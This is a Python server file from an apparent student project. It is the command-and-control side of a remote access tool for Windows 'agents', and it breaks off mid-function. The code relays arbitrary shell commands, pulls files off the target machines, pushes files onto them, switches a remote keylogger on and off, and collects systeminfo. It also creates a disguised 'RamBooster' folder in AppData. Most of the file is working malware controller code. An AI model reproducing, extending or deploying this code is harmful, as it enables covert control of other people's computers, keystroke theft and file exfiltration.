# /**********************************************************************************************************************************************************************************

# Nom du fichier : server.py
# Rôle du fichier : Fichier gérant le lancement du server s'occupant de vérifier si la connexion est établie avec le client.

# Auteur : Maxime BRONNY
# Version : V1
# Licence : Réalisé dans le cadre des cours "PROJET TUTEURE" L3 INFORMATIQUE IED
# Usage : Ce fichier s'exécute lors du lancement de l'interface graphique :
#           - LANCEMENT DE L'INTERFACE GRAPHIQUE : 
#               - python3 GUI.py

#           - Le fichier gérant l'interface graphique lance ce fichier avec la commande :
#               - python3 server.py

# *********************************************************************************************************************************************************************************/


# =============================================================================
# Importation des bibliothèques nécessaires
# =============================================================================

import socket           # Pour la gestion des connexions réseau (TCP/IP) entre le serveur et les agents
import re               # Pour l'utilisation des expressions régulières (validation, parsing d'IP, etc.)
import threading        # Pour la gestion du multithreading (gérer plusieurs connexions simultanées)
import time             # Pour la gestion du temps (délais, timestamps, timeouts)
import os               # Pour les opérations système (fichiers, répertoires, variables d'environnement)
from ipaddress import ip_address  # Pour la validation et la manipulation des adresses IP
from flask import *      # Pour la création de l'API web (interface Flask pour le serveur)
import sqlite3           # Pour la gestion de la base de données SQLite (stockage des agents, sessions, etc.)
import subprocess        # Pour lancer des processus externes (commandes système, scripts, etc.)
from sqlite3 import Error  # Pour la gestion des exceptions spécifiques à SQLite
import hashlib           # Pour le hachage (identifiants uniques, sécurité, etc.)
import uuid              # Pour générer des identifiants uniques (sessions, agents, etc.)
from datetime import datetime  # Pour la gestion des dates et heures (logs, timestamps, etc.)

import GUI  # Pour l'intégration de l'interface graphique (GUI.py doit fournir une fonction de lancement)


# =============================================================================
# Création d'un verrou pour la synchronisation lors d'accès concurrentiels
# =============================================================================

lock = threading.Lock()


# =============================================================================
# Configuration réseau du serveur
# =============================================================================

ip_address = '192.168.1.58'    # Adresse IP du serveur
port_number = 5001            # Port du serveur
thread_index = 0               # Index initial pour la gestion des threads


# =============================================================================
# Listes de gestion des agents et des connexions
# =============================================================================

THREADS = []       # Liste globale pour des threads généraux (si nécessaire)
t = []             # Liste pour stocker les threads associés aux connexions d'agents
bufferping = []    # Liste pour stocker les réponses aux tests de ping des agents
CMD_IN = []        # Liste pour stocker les commandes entrantes destinées aux agents
CMD_OUT = []       # Liste pour stocker les réponses ou résultats renvoyés par les agents
IPS = []           # Liste pour stocker les adresses IP des agents

# =============================================================================
# Listes de sauvegarde et d'information
# =============================================================================

BckpTHREADS = []   # Liste de sauvegarde pour les threads (backup)
BckpIPS = []       # Liste de sauvegarde pour les adresses IP (backup)
BckpKeepAlive = [] # Liste de sauvegarde pour les processus KeepAlive (backup)

InfoIP = []        # Liste pour stocker des informations liées aux IP des agents
InfoChecked = []   # Liste indiquant si les informations des agents ont été vérifiées
BufferOutput = []  # Liste pour stocker temporairement la sortie des commandes exécutées sur les agents
agentname = []     # Liste pour stocker le nom des agents

# =============================================================================
# Nouvelles structures pour gérer les connexions persistantes
# =============================================================================

active_connections = {}  # Dictionnaire {ID_index: {'socket': socket, 'last_activity': timestamp, 'ip': ip_address}}
connection_sessions = {}  # Dictionnaire {ip_address: {'session_id': uuid, 'machine_id': hash, 'last_seen': timestamp}}
SOCKET_TIMEOUT = 300  # Timeout en secondes avant de considérer une connexion comme inactive
HEARTBEAT_TIMEOUT = 120  # Timeout pour les heartbeats


# =============================================================================
# Connexion à la base de données SQLite
# =============================================================================

# 'check_same_thread=False' pour autoriser l'accès multi-thread à la base de données.
con = sqlite3.connect('test.db', check_same_thread=False)
print("Opened database successfully")
cur = con.cursor()


# =============================================================================
# Créer une table de sessions si elle n'existe pas
# =============================================================================

with lock:
    cur.execute('''CREATE TABLE IF NOT EXISTS Sessions
                   (session_id TEXT PRIMARY KEY,
                    agent_id INTEGER,
                    ip_address TEXT,
                    machine_id TEXT,
                    created_at TIMESTAMP,
                    last_activity TIMESTAMP,
                    FOREIGN KEY (agent_id) REFERENCES Agents(ID))''')
    con.commit()


# =============================================================================
# Fonctions utilitaires pour la gestion des sessions existantes ou nouvelles
# =============================================================================

def get_or_create_session(ip_address, machine_id=None):
    """
    Récupère ou crée une session pour une machine donnée.
    Utilise l'IP et un identifiant machine unique pour éviter les doublons.
    """
    with lock:
        # Vérifier si une session existe déjà pour cette IP
        cur.execute("SELECT session_id, machine_id FROM Sessions WHERE ip_address = ?", (ip_address,))
        result = cur.fetchone()
        
        if result:
            session_id, existing_machine_id = result
            # Si c'est la même machine, mettre à jour l'activité
            if machine_id and machine_id == existing_machine_id:
                cur.execute("UPDATE Sessions SET last_activity = ? WHERE session_id = ?", 
                           (datetime.now(), session_id))
                con.commit()
                return session_id, False  # Session existante
            # Si c'est une machine différente avec la même IP, créer une nouvelle session
            else:
                session_id = str(uuid.uuid4())
                cur.execute("INSERT INTO Sessions (session_id, ip_address, machine_id, created_at, last_activity) VALUES (?, ?, ?, ?, ?)",
                           (session_id, ip_address, machine_id, datetime.now(), datetime.now()))
                con.commit()
                return session_id, True  # Nouvelle session
        else:
            # Créer une nouvelle session
            session_id = str(uuid.uuid4())
            cur.execute("INSERT INTO Sessions (session_id, ip_address, machine_id, created_at, last_activity) VALUES (?, ?, ?, ?, ?)",
                       (session_id, ip_address, machine_id, datetime.now(), datetime.now()))
            con.commit()
            return session_id, True  # Nouvelle session


# =============================================================================
# Fonctions utilitaires pour la gestion des connexions inactives
# =============================================================================

def cleanup_inactive_connections():
    """
    Thread qui nettoie périodiquement les connexions inactives.
    """
    while True:
        time.sleep(30)  # Vérifier toutes les 30 secondes
        current_time = time.time()
        
        with lock:
            inactive_ids = []
            for id_index, conn_info in active_connections.items():
                if current_time - conn_info['last_activity'] > SOCKET_TIMEOUT:
                    inactive_ids.append(id_index)
            
            # Fermer les connexions inactives
            for id_index in inactive_ids:
                if id_index in active_connections:
                    try:
                        active_connections[id_index]['socket'].close()
                    except:
                        pass
                    del active_connections[id_index]
                    # Marquer l'agent comme offline
                    cur.execute("UPDATE Agents SET State=? WHERE ID = ?", ("offline", id_index))
                    con.commit()
                    print(f"[CLEANUP] Connexion inactive fermée pour l'agent {id_index}")


# ==========================================================================================
# Fonction utilitaire de récupération des informations des agents en ligne et hors ligne
# ==========================================================================================

def recupinfo():
    """
    Récupère et met à jour les informations des agents depuis la base de données.

    Cette fonction interroge la table 'Agents' pour obtenir :
      - Les adresses IP (Ips)
      - Les identifiants (ID)
      - L'état de chaque agent (State)
      - Les informations supplémentaires (Info)

    L'utilisation du verrou (lock) assure un accès exclusif lors de la lecture
    de la base de données pour éviter les conflits multi-thread.
    """
    global Ips, State, Info, ID, Filtre

    # Récupération des adresses IP des agents
    with lock:
        cur.execute("SELECT Ip FROM Agents")
        Ips = cur.fetchall()

    # Récupération des identifiants des agents et conversion en liste simple
    with lock:
        cur.execute("SELECT ID FROM Agents")
        ID = cur.fetchall()
        ID = list(sum(ID, ()))

    # Récupération de l'état de chaque agent et conversion en liste simple
    with lock:
        cur.execute("SELECT State FROM Agents")
        State = cur.fetchall()
        State = list(sum(State, ()))

    # Récupération des informations supplémentaires et conversion en liste simple
    with lock:
        cur.execute("SELECT Info FROM Agents")
        Info = cur.fetchall()
        Info = list(sum(Info, ()))


# =============================================================================
# Fonction utilitaire de vérification des connexions clients en ligne
# =============================================================================

def KeepAlive():
    """
    Vérifie périodiquement l'état des connexions clients.

    Cette fonction met à jour les listes d'identifiants (ID) et d'états (State)
    à partir de la base de données. Pour chaque agent connecté (état 'online'),
    elle effectue un test de ping en envoyant la commande 'TEST' lorsque aucune commande
    n'est en attente dans CMD_IN.
    """
    global ID, State, CMD_IN, KA_index, active_connections, bufferping

    while True:
        # Attendre avant de commencer les vérifications
        time.sleep(60)  # Vérifier toutes les 60 secondes
        
        try:
            # Actualisation des identifiants et des états à chaque itération
            with lock:
                cur.execute("SELECT ID, State FROM Agents WHERE State = 'online'")
                online_agents = cur.fetchall()

            # Si au moins un agent est en ligne
            if len(online_agents) > 0:
                print("[KEEPALIVE] Étape 2 : Vérification des connexions...")

                for agent_id, state in online_agents:
                    # Vérifier si l'agent est dans les connexions actives
                    if agent_id in active_connections:
                        print(f"[KEEPALIVE] Vérification de l'agent {agent_id}")
                        
                        # S'assurer que les buffers sont assez grands
                        while len(CMD_IN) <= agent_id:
                            CMD_IN.append('')
                            CMD_OUT.append('')
                            bufferping.append('')
                            t.append('')
                        
                        # Vérifier si on peut envoyer un TEST
                        if CMD_IN[agent_id] == '':
                            try:
                                # Marquer le buffer comme KO avant d'envoyer
                                bufferping[agent_id] = 'KO'
                                
                                # Envoyer la commande TEST
                                CMD_IN[agent_id] = 'TEST'
                                
                                # Attendre la réponse (max 30 secondes)
                                timeout = 30
                                start_time = time.time()
                                while bufferping[agent_id] == 'KO' and time.time() - start_time < timeout:
                                    time.sleep(1)
                                
                                # Si pas de réponse après timeout
                                if bufferping[agent_id] == 'KO':
                                    print(f"[KEEPALIVE] Agent {agent_id} ne répond pas au ping")
                                    # L'agent sera marqué offline par hdl_conn
                                else:
                                    print(f"[KEEPALIVE] Agent {agent_id} a répondu au ping")
                                    
                            except Exception as e:
                                print(f"[KEEPALIVE] Erreur lors du ping de l'agent {agent_id}: {e}")
                        else:
                            print(f"[KEEPALIVE] Agent {agent_id} occupé, ping reporté")
                    else:
                        # L'agent est marqué online mais pas dans active_connections
                        print(f"[KEEPALIVE] Agent {agent_id} marqué online mais pas actif")
                        with lock:
                            cur.execute("UPDATE Agents SET State=? WHERE ID = ?", ("offline", agent_id))
                            con.commit()
                            
        except Exception as e:
            print(f"[KEEPALIVE] Erreur dans la boucle KeepAlive: {e}")
            time.sleep(5)  # Attendre un peu avant de réessayer


# =================================================================================
# Initialisation des listes globales pour gérer les agents (taille max: 50 agents)
# =================================================================================

# Chaque élément des listes ci-dessous correspond aux informations ou ressources associées à un agent.
for i in range(50):
    # CMD_IN : stocke la commande entrante à envoyer à l'agent
    CMD_IN.append('')

    # CMD_OUT : stocke la réponse ou la sortie de commande renvoyée par l'agent
    CMD_OUT.append('')

    # t : conserve la référence au thread associé à la connexion de l'agent
    t.append('')

    # bufferping : tampon pour mesurer la réactivité (ping) de l'agent
    bufferping.append('')

    # IPS : stocke l'adresse IP de l'agent
    IPS.append('')

    # BckpIPS : sauvegarde des adresses IP (backup)
    BckpIPS.append('')

    # BckpKeepAlive : sauvegarde des informations KeepAlive pour l'agent (backup)
    BckpKeepAlive.append('')

    # InfoIP : stocke des informations concernant l'IP de l'agent
    InfoIP.append('')

    # InfoChecked : indique si les informations de l'agent ont été vérifiées
    InfoChecked.append('')

    # BufferOutput : tampon pour stocker la sortie des commandes exécutées sur l'agent
    BufferOutput.append('')

    # agentname : stocke le nom défini pour l'agent
    agentname.append('')

# Création de l'application Flask pour le serveur web intégré
app = Flask(__name__)

# =============================================================================
# Fonction utilitaire de fermeture de la connexion avec le client
# =============================================================================

def close_connection(connection, ID_index):
    """
    Ferme la connexion avec le client et met à jour l'état de l'agent dans la base de données.

    Ce processus se décompose en trois étapes :
      1. Fermer la connexion active.
      2. Mettre à jour l'état de l'agent dans la base de données en le marquant comme "offline".
      3. Réinitialiser les buffers de commande associés à cet agent.
    
    Paramètres:
       - connection : l'objet socket représentant la connexion avec le client.
       - ID_index   : l'identifiant de l'agent dans la base de données.
    """
    
    # Étape 1 : Tentative de fermeture de la connexion
    print("Fermeture de la connexion - Étape 1 : Tentative de fermeture de la connexion.")
    try:
        # Vérifier d'abord si le socket est encore connecté
        connection.getpeername()  # Cela lève une exception si le socket n'est pas connecté
        connection.shutdown(socket.SHUT_RDWR)
        connection.close()
        print("Connexion fermée avec succès.")
    except socket.error as e:
        if e.errno == 107:  # Transport endpoint is not connected
            print("Le socket était déjà déconnecté.")
        elif e.errno == 9:  # Bad file descriptor
            print("Le socket était déjà fermé.")
        else:
            print(f"Erreur lors de la fermeture de la connexion : {e}")
        # Essayer de fermer quand même
        try:
            connection.close()
        except:
            pass
    except Exception as e:
        print(f"Erreur inattendue lors de la fermeture : {e}")
    
    # Supprimer de la liste des connexions actives
    with lock:
        if ID_index in active_connections:
            del active_connections[ID_index]
    
    # Étape 2 : Mise à jour de l'état dans la base de données
    print("Mise à jour de l'état - Étape 2 : Modification de l'état dans la base de données pour marquer l'agent 'offline'.")
    try:
        lock.acquire()  # Acquisition du verrou pour garantir l'accès exclusif à la base de données
        cur.execute("UPDATE Agents SET State=? WHERE ID = ?", ("offline", ID_index))
        con.commit()
        print("L'état de l'agent a été mis à jour dans la base de données avec succès.")
    except Exception as e:
        print("Erreur lors de la mise à jour de la base de données :", e)
    finally:
        lock.release()  # Libération du verrou, même en cas d'erreur
    
    
    # Étape 3 : Nettoyage des buffers de commande
    print("Nettoyage - Étape 3 : Réinitialisation des buffers de commande.")
    CMD_IN[ID_index] = ''
    CMD_OUT[ID_index] = ''
    
    print("Fermeture de la connexion terminée.")


# =============================================================================
# Fonction utilitaire de gestion de la communication avec le client
# =============================================================================

def hdl_conn(connection, address, ID_index):
    """
    Gère la communication avec un client connecté.

    Cette fonction itère en continu tant que la commande associée au client 
    (CMD_IN[ID_index]) n'est pas 'quit'. Elle décode et traite la commande envoyée 
    par le client, en exécutant différentes actions selon la commande (téléchargement, 
    upload, activation/désactivation du keylogger, test de ping, récupération d'informations 
    système, etc.).  
    Lorsque la commande 'quit' est reçue ou qu'une erreur fatale survient, la session se termine.

    Paramètres:
       - connection: objet de connexion du socket avec le client.
       - address: adresse IP et port du client.
       - ID_index: identifiant de l'agent (client) dans la base de données.
    """
    global CMD_OUT, CMD_IN, InfoChecked, BufferOutput, bufferping
    global lock, cur, con, t, active_connections

    # Variable locale pour savoir si cette connexion est toujours active
    connection_active = True

    # Configurer le socket pour des connexions persistantes
    try:
        # Activer TCP keepalive
        connection.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        # Configuration spécifique à Windows
        if hasattr(socket, 'TCP_KEEPIDLE'):
            connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
        if hasattr(socket, 'TCP_KEEPINTVL'):
            connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
        if hasattr(socket, 'TCP_KEEPCNT'):
            connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)
            
        # Désactiver l'algorithme de Nagle pour réduire la latence
        connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        # Augmenter la taille des buffers pour améliorer les performances
        connection.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
        connection.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)

    except Exception as e:
        print(f"[WARNING] Impossible de configurer les options du socket : {e}")

    # Enregistrer la connexion active
    with lock:
        active_connections[ID_index] = {
            'socket': connection,
            'last_activity': time.time(),
            'ip': address[0]
        }

    # Boucle principale de traitement des commandes du client
    while connection_active and CMD_IN[ID_index] != 'quit':
        # Vérifier si cette connexion est toujours dans active_connections
        with lock:
            if ID_index not in active_connections:
                print(f"[INFO] Connexion {ID_index} n'est plus active, arrêt du thread")
                break

        # Si aucune commande n'est présente, passer à l'itération suivante
        if CMD_IN[ID_index] == '':
            # Vérifier si on a reçu des données spontanées du client (comme un heartbeat)
            try:
                connection.settimeout(0.1)  # Timeout court pour ne pas bloquer
                data = connection.recv(1024)
                if data:
                    msg = data.decode(errors='ignore')
                    if msg == 'HEARTBEAT':
                        # Mettre à jour l'activité
                        with lock:
                            if ID_index in active_connections:
                                active_connections[ID_index]['last_activity'] = time.time()
                        print(f"[HEARTBEAT] Reçu de l'agent {ID_index}")
                connection.settimeout(None)  # Remettre en mode bloquant
            except socket.timeout:
                pass
            except socket.error as e:
                if e.errno == 9:  # Bad file descriptor
                    print(f"[INFO] Socket fermé pour l'agent {ID_index}")
                    connection_active = False
                    break
            except Exception:
                pass
            continue

        # Mettre à jour l'activité lors du traitement d'une commande
        with lock:
            if ID_index in active_connections:
                active_connections[ID_index]['last_activity'] = time.time()

        # Affichage de la commande reçue et identification du client
        print(f"[INFO] Commande reçue : {CMD_IN[ID_index]} (Client ID : {ID_index})")

        try:
            # Séparation de la commande et de ses arguments
            parts = CMD_IN[ID_index].split(" ")
            cmd = parts[0]

            # --- Commande 'download' ---
            if cmd == 'download':
                # Extraction du nom de fichier (sans chemin)
                filename = parts[1].split("\\")[-1]
                connection.send(CMD_IN[ID_index].encode())
                # Réception du contenu du fichier (taille max : 1024 * 10000 octets)
                contents = connection.recv(1024 * 10000)
                if contents != b"erreur dl":
                    # Sauvegarde du fichier localement en cas de téléchargement réussi
                    with open(filename, 'wb') as f:
                        f.write(contents)
                    CMD_OUT[ID_index] = 'Transfert du fichier réussi'
                else:
                    CMD_OUT[ID_index] = 'Fichier introuvable'

            # --- Commande 'upload' ---
            elif cmd == 'upload':
                filename = parts[1]
                filesize = parts[2]  # La taille du fichier est récupérée mais non utilisée ici
                connection.send(CMD_IN[ID_index].encode())
                # Lecture du fichier à uploader depuis le dossier 'output'
                with open(f'.\\output\\{filename}', 'rb') as f:
                    contents = f.read()
                connection.send(contents)
                # Réception de la confirmation du client
                msg = connection.recv(5120).decode(errors='ignore')
                CMD_OUT[ID_index] = 'Fichier uploadé' if msg == 'Fichier recu' else 'Une erreur est survenue'

            # --- Commandes pour activer ou désactiver le keylogger ---
            elif CMD_IN[ID_index] in ['keylog on', 'keylog off']:
                connection.send(CMD_IN[ID_index].encode())
                msg = connection.recv(5120).decode(errors='ignore')
                CMD_OUT[ID_index] = msg

            # --- Commande 'TEST' pour vérifier la réactivité du client ---
            elif CMD_IN[ID_index] == 'TEST':
                time.sleep(15)
                try:
                    connection.send(CMD_IN[ID_index].encode())
                    # Réception de la réponse de test via le buffer de ping
                    bufferping[ID_index] = connection.recv(1024).decode(errors='ignore')
                    # Mise à jour de l'état si la réponse est positive ('OK')
                    if bufferping[ID_index] == 'OK':
                        with lock:
                            cur.execute("UPDATE Agents SET State=? WHERE ID = ?", ("online", ID_index))
                            con.commit()
                    else:
                        raise ConnectionError("Client non réactif")
                except:
                    # En cas d'échec, fermer la connexion et marquer l'état comme 'offline'
                    connection_active = False
                    with lock:
                        cur.execute("UPDATE Agents SET State=? WHERE ID = ?", ("offline", ID_index))
                        con.commit()
                        if ID_index in active_connections:
                            del active_connections[ID_index]
                    CMD_IN[ID_index] = 'quit'
                    break

            # --- Commandes pour récupérer les informations système du client ---
            elif CMD_IN[ID_index] in ['ExistCheckInfo', 'FirstcheckInfo']:
                try:
                    # Construction de la commande pour extraire le modèle du système et le nom de l'hôte
                    msg = 'systeminfo | findstr /b "Modèle du système:" & systeminfo | findstr /b "Nom de l\'hôte:"'
                    connection.send(msg.encode())
                    InfoBuffer = connection.recv(5120).decode(errors='ignore')

                    # Mise à jour de la base de données avec les informations recueillies
                    with lock:
                        cur.execute("UPDATE Agents SET Info=? WHERE ID = ?", (InfoBuffer, ID_index))
                        con.commit()

                    if CMD_IN[ID_index] == 'FirstcheckInfo':
                        # Création d'un répertoire et copie de RamBooster.exe (optionnel)
                        msg = 'mkdir "C:\\%HOMEPATH%\\AppData\\Local\\RamBooster" & echo Repertoire cree'
                        connection.send(msg.encode())
                        BufferOutput[ID_index] = connection.recv(5120).decode(errors='ignore')
                        print(f"[INFO] Répertoire créé pour l'agent {ID_index}: {BufferOutput[ID_index]}")

                        # Pas de fichier batch à uploader, l'agent est maintenant prêt
                        print(f"[INFO] Agent {ID_index} initialisé sans fichier batch")

                    # Met à jour la sortie de commande pour le client et réinitialise BufferOutput
                    CMD_OUT[ID_index] = InfoBuffer if CMD_IN[ID_index] == 'ExistCheckInfo' else BufferOutput[ID_index]
                    BufferOutput[ID_index] = ''
                    
                    # IMPORTANT : Marquer la commande comme terminée
                    print(f"[INFO] Commande {CMD_IN[ID_index]} terminée pour l'agent {ID_index}")
                    
                except socket.error as e:
                    print(f"[ERROR] Erreur socket lors du traitement de {CMD_IN[ID_index]}: {e}")
                    CMD_OUT[ID_index] = f'Erreur: {e}'
                except Exception as e:
                    print(f"[ERROR] Erreur lors du traitement de {CMD_IN[ID_index]}: {e}")
                    CMD_OUT[ID_index] = f'Erreur: {e}'

            # --- Traitement de toute autre commande ---
            else:
                if CMD_IN[ID_index] == 'quit':
                    connection.send(CMD_IN[ID_index].encode())
                    break
                try:
                    connection.send(CMD_IN[ID_index].encode())
                    BufferOutput[ID_index] = connection.recv(1024 * 10000).decode(errors='ignore')
                    CMD_OUT[ID_index] = BufferOutput[ID_index]
                except:
                    print(f"[ERREUR] Commande échouée : {CMD_IN[ID_index]}")
                time.sleep(5)

        except socket.error as e:
            if e.errno == 9:  # Bad file descriptor
                print(f"[INFO] Socket fermé pour l'agent {ID_index}")
                connection_active = False
                break
            elif e.errno == 32:  # Broken pipe
                print(f"[INFO] Broken pipe pour l'agent {ID_index}")
                connection_active = False
                break
            elif e.errno == 107:  # Transport endpoint is not connected
                print(f"[INFO] Transport endpoint not connected pour l'agent {ID_index}")
                connection_active = False
                break
            else:
                print(f"[EXCEPTION] Socket error: {e}")
                CMD_OUT[ID_index] = 'Une erreur est survenue'
        except Exception as e:
            # Gestion des exceptions et mise à jour de la sortie d'erreur
            print(f"[EXCEPTION] {e}")
            CMD_OUT[ID_index] = 'Une erreur est survenue'
            time.sleep(1)

        # Réinitialisation de la commande pour continuer l'écoute
        CMD_IN[ID_index] = ''

    # Fin de session pour le client lorsque 'quit' est reçu
    print(f"[INFO] Fin de session pour client ID : {ID_index}")
    if connection_active:
        close_connection(connection, ID_index)
    # t[ID_index].join()  # SUPPRIMÉ : on ne join pas le thread courant


# =============================================================================
# Fonction utilitaire pour les sockets serveur
# =============================================================================

def srv_scket():
    global THREADS, t, BckpTHREADS, BckpIPS
    global Ips, InfoChecked, State, bufferping

    # Crée un socket TCP pour le serveur
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Permettre la réutilisation rapide du port
    ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ss.bind((ip_address, port_number))
    ss.listen(50)  # Le serveur peut accepter jusqu'à 50 connexions en file d'attente

    while True:
        # Attente d'une nouvelle connexion entrante
        connection, address = ss.accept()
        print("Connexion entrante depuis l'adresse :", address)

        # Mise à jour des informations relatives aux agents connectés
        recupinfo()
        ip_str = address[0]
        found = False  # Flag indiquant si l'IP du client existe déjà dans la base
        
        # Vérifier d'abord si une connexion active existe pour cette IP
        existing_connection = None
        with lock:
            for id_idx, conn_info in active_connections.items():
                if conn_info['ip'] == ip_str:
                    existing_connection = id_idx
                    break
        
        if existing_connection is not None:
            # Une connexion active existe déjà pour cette IP
            print(f"[INFO] Connexion active détectée pour {ip_str}")
            
            # Vérifier si la connexion existante est vraiment active
            current_time = time.time()
            if (existing_connection in active_connections and 
                current_time - active_connections[existing_connection]['last_activity'] < 30):
                # La connexion est récente et active, refuser la nouvelle connexion
                print(f"[INFO] Connexion existante encore active, fermeture de la nouvelle connexion")
                connection.close()
                return  # Ne pas traiter cette nouvelle connexion
            else:
                # L'ancienne connexion est inactive, la remplacer
                print(f"[INFO] Ancienne connexion inactive, remplacement...")
                # Marquer la commande comme quit pour arrêter l'ancien thread
                if existing_connection in CMD_IN and len(CMD_IN) > existing_connection:
                    CMD_IN[existing_connection] = 'quit'
                # Fermer l'ancienne connexion
                try:
                    if existing_connection in active_connections:
                        active_connections[existing_connection]['socket'].shutdown(socket.SHUT_RDWR)
                        active_connections[existing_connection]['socket'].close()
                except:
                    pass
                with lock:
                    if existing_connection in active_connections:
                        del active_connections[existing_connection]
                # Attendre un peu pour que l'ancien thread se termine
                time.sleep(0.5)

        # Cas 1 : Aucun agent n'est encore enregistré dans la base de données
        if len(Ips) == 0:
            with lock:
                # Récupération des informations système du client
                hostname = socket.getfqdn(address[0])
                username = 'Test Machine virtuelle'
                os_name = 'Windows 10'
                cur.execute(
                    "INSERT INTO Agents (Ip, Hostname, Username, OS, State) VALUES (?, ?, ?, ?, ?)",
                    (str(address), hostname, username, os_name, "online")
                )
                con.commit()

                # Récupération de l'ID attribué à l'agent (selon son adresse IP)
                cur.execute("SELECT ID FROM Agents WHERE Ip LIKE ?", ('%' + ip_str + '%',))
            ID_index = cur.fetchone()[0]
            print("Nouvel agent ajouté avec l'ID :", ID_index)

            # Créer une session pour cet agent
            session_id, is_new = get_or_create_session(ip_str)
            with lock:
                cur.execute("UPDATE Sessions SET agent_id = ? WHERE session_id = ?", (ID_index, session_id))
                con.commit()

            # Initialisation du buffer de ping et configuration de la commande initiale
            bufferping[ID_index] = 'OK'
            t[ID_index] = threading.Thread(target=hdl_conn, args=(connection, address, ID_index))
            # Ne pas envoyer FirstcheckInfo automatiquement pour éviter les problèmes
            # CMD_IN[ID_index] = "FirstcheckInfo"
            CMD_IN[ID_index] = ""  # Laisser vide, attendre les commandes manuelles
            t[ID_index].start()

        else:
            # Parcours de la liste des agents déjà enregistrés
            for i in range(len(Ips)):
                ip_in_db = str(Ips[i][0])
                # Vérifie si l'adresse IP du client entrant correspond à une entrée existante
                if ip_str in ip_in_db:
                    found = True
                    
                    # Récupérer l'ID depuis la base de données
                    with lock:
                        cur.execute("SELECT ID FROM Agents WHERE Ip LIKE ?", ('%' + ip_str + '%',))
                        result = cur.fetchone()
                        if result:
                            ID_index = result[0]
                        else:
                            # Si l'agent n'existe plus dans la base, passer au cas "non trouvé"
                            found = False
                            break

                    if State[i] == 'online' and ID_index not in active_connections:
                        # L'agent est marqué en ligne mais pas dans les connexions actives
                        # C'est probablement une reconnexion après un crash
                        print("Agent marqué en ligne mais pas actif. Mise à jour...")
                        with lock:
                            cur.execute("UPDATE Agents SET State=? WHERE ID = ?", ("online", ID_index))
                            con.commit()
                        
                        # Utiliser l'ID existant
                        bufferping[ID_index] = 'OK'
                        # S'assurer que les buffers sont initialisés pour cet ID
                        while len(CMD_IN) <= ID_index:
                            CMD_IN.append('')
                            CMD_OUT.append('')
                            bufferping.append('')
                            t.append('')
                            
                        t[ID_index] = threading.Thread(target=hdl_conn, args=(connection, address, ID_index))
                        # Ne pas envoyer ExistCheckInfo automatiquement pour éviter les problèmes
                        # CMD_IN[ID_index] = "ExistCheckInfo"
                        CMD_IN[ID_index] = ""  # Laisser vide, attendre les commandes manuelles
                        t[ID_index].start()

                    elif State[i] == 'offline':
                        # Si l'agent est hors ligne, on met à jour son état
                        print("Agent déjà présent mais hors ligne. Réactivation...")

                        with lock:
                            cur.execute("UPDATE Agents SET State=?, Ip=? WHERE ID = ?", ("online", str(address), ID_index))
                            con.commit()
                        
                        # Mettre à jour la session
                        session_id, is_new = get_or_create_session(ip_str)
                        with lock:
                            cur.execute("UPDATE Sessions SET agent_id = ?, last_activity = ? WHERE session_id = ?", 
                                       (ID_index, datetime.now(), session_id))
                            con.commit()

                        bufferping[ID_index] = 'OK'
                        # S'assurer que les buffers sont initialisés pour cet ID
                        while len(CMD_IN) <= ID_index:
                            CMD_IN.append('')
                            CMD_OUT.append('')
                            bufferping.append('')
                            t.append('')
                            
                        t[ID_index] = threading.Thread(target=hdl_conn, args=(connection, address, ID_index))
                        # Ne pas envoyer ExistCheckInfo automatiquement pour éviter les problèmes
                        # CMD_IN[ID_index] = "ExistCheckInfo"
                        CMD_IN[ID_index] = ""  # Laisser vide, attendre les commandes manuelles
                        t[ID_index].start()

                    # Une fois l'agent correspondant trouvé, sortir de la boucle
                    break

            # Cas 3 : L'adresse IP du client n'a pas été trouvée dans les agents existants
            if not found:
                print("Nouvelle adresse IP détectée. Inscription de l'agent dans la base de données...")
                with lock:
                    hostname = socket.getfqdn(address[0])
                    username = 'Test Machine virtuelle'
                    os_name = 'Windows 10'
                    cur.execute(
                        "INSERT INTO Agents (Ip, Hostname, Username, OS, State) VALUES (?, ?, ?, ?, ?)",
                        (str(address), hostname, username, os_name, "online")
                    )
                    con.commit()
                    cur.execute("SELECT ID FROM Agents WHERE Ip LIKE ?", ('%' + ip_str + '%',))
                ID_index = cur.fetchone()[0]
                print("Nouvel agent inscrit avec l'ID :", ID_index)

                # Créer une session pour cet agent
                session_id, is_new = get_or_create_session(ip_str)
                with lock:
                    cur.execute("UPDATE Sessions SET agent_id = ? WHERE session_id = ?", (ID_index, session_id))
                    con.commit()

                # S'assurer que les buffers sont initialisés pour cet ID
                while len(CMD_IN) <= ID_index:
                    CMD_IN.append('')
                    CMD_OUT.append('')
                    bufferping.append('')
                    t.append('')

                bufferping[ID_index] = 'OK'
                t[ID_index] = threading.Thread(target=hdl_conn, args=(connection, address, ID_index))
                # Ne pas envoyer FirstcheckInfo automatiquement pour éviter les problèmes
                # CMD_IN[ID_index] = "FirstcheckInfo"
                CMD_IN[ID_index] = ""  # Laisser vide, attendre les commandes manuelles
                t[ID_index].start()


# =============================================================================
# Lance les sockets serveur et le KeepAlive une seule fois
# =============================================================================

server_started = False


# =============================================================================
# Initialisation du serveur avant le traitement de chaque requête Flask
# =============================================================================

@app.before_request
def init_server():
    """
    Initialisation du serveur avant le traitement de chaque requête Flask.
    
    Cette fonction s'assure que le serveur est démarré qu'une seule fois.
    Si le serveur n'a pas encore été lancé (server_started est False) :
      1. Elle acquiert un verrou (lock) pour synchroniser l'accès à la base de données.
      2. Elle met à jour l'état de tous les agents dans la base de données en les passant en "offline".
      3. Elle lance en arrière-plan (daemon) les threads du serveur (srv_scket) qui gère les connexions,
         ainsi que le thread KeepAlive qui effectue des vérifications régulières.
      4. Enfin, elle définit la variable server_started à True pour éviter de réinitialiser le serveur à chaque requête.
    """
    global server_started
    if not server_started:
        try:
            # Acquisition du lock pour garantir l'exclusivité lors de la mise à jour de la base de données
            lock.acquire(True)
            # Mise à jour de l'état de tous les agents, les marquant comme "offline"
            cur.execute("UPDATE Agents SET State = ?", ("offline",))
            con.commit()
        finally:
